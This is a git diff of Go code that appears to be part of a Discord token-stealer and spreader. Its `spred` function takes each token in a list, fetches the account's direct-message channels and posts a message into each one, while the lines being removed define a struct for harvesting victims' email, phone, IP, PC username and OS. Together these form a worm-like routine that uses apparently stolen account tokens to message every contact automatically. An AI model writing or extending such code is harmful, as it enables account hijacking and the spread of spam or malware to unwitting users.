@@ -19,7 +19,7 @@ import (
 	"golang.org/x/exp/slices"
 )
 
-var tokens []string = []string{}
+var tokens []string
 
 type UserData struct {
 	Id                string
@@ -36,16 +36,9 @@ type User struct {
 	User     UserData
 }
 
-type Data struct {
-	Username    string
-	Email       string
-	Phone       string
-	Nitro       string
-	Ip          string
-	DisplayName string
-	PCUsername  string
-	OS          string
-	CPUArch     string
+type Message struct {
+	Content string `json:"content"`
+	Tts     bool   `json:"tts"`
 }
 
 const (
@@ -63,28 +56,12 @@ func spred() {
 	for _, token := range tokens {
 		fmt.Println(token)
 		//  var friends []string
-		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, token)
+		body, err := getRequest("https://discord.com/api/v9/users/@me/channels", true, token)
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
-		// fmt.Println(body)
-		// test_data := []byte(`
-		// ["
-		// 	{"id": "162664712394244097",
-		// 	"nickname": null,
-		// 	"user":
-		// 		{"id": "162664712394244097",
-		// 		"username": "ChiliPepperHott",
-		// 		"avatar": "a74dc64a0ddec227d71f4a372e71a5a9",
-		// 		"avatar_decoration": null,
-		// 		"discriminator": "4147",
-		// 		"public_flags": 64}}
-		// ]`)
-		// test_data2 := []byte(`
-		// [
-		// 	{"id": "162664712394244097"}
-		// ]`)
+		fmt.Println(body)
 
 		var Friends []User
 		err1 := json.Unmarshal([]byte(body), &Friends)
@@ -93,29 +70,31 @@ func spred() {
 			fmt.Println(err1)
 		}
 
-		for i, user := range Friends {
-			fmt.Printf("%s: %v\n", string(rune(i)), user)
-			data := []byte(`{
-				'content': "this is an atumated msg",
-				'tts': false
-			}`)
-			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/758070785993867356/messages", bytes.NewBuffer(data))
+		var requests []*http.Request
+		for _, friend := range Friends {
+			//fmt.Printf("%s: %v\n", string(rune(i)), user)
+			data := new(Message)
+			data.Content = "Ignore this msg please, im testing a program"
+			data.Tts = false
+			d, _ := json.Marshal(data)
+			req, wth := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+friend.Id+"/messages", bytes.NewBuffer(d))
+			fmt.Println("https://discord.com/api/v9/channels/" + friend.Id + "/messages")
 			if wth != nil {
 				fmt.Println(wth)
 			}
+			req.Header.Set("Content-Type", "application/json")
 			req.Header.Set("Authorization", token)
-			fmt.Println(token)
-			cl := &http.Client{}
-			res, err := cl.Do(req)
-			if err == nil {
-				fmt.Println(string(res.StatusCode) + " " + res.Status)
-			} else {
-				fmt.Println("ets")
-			}
-
-			res.Body.Close()
+			requests = append(requests, req)
 		}
 
+		fmt.Println(len(requests))
+
+		for _, req := range requests {
+			cl := &http.Client{}
+			res, _ := cl.Do(req)
+			fmt.Println(string(res.StatusCode) + " " + res.Status)
+			time.Sleep(3 * time.Second)
+		}
 		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
 	}
 }
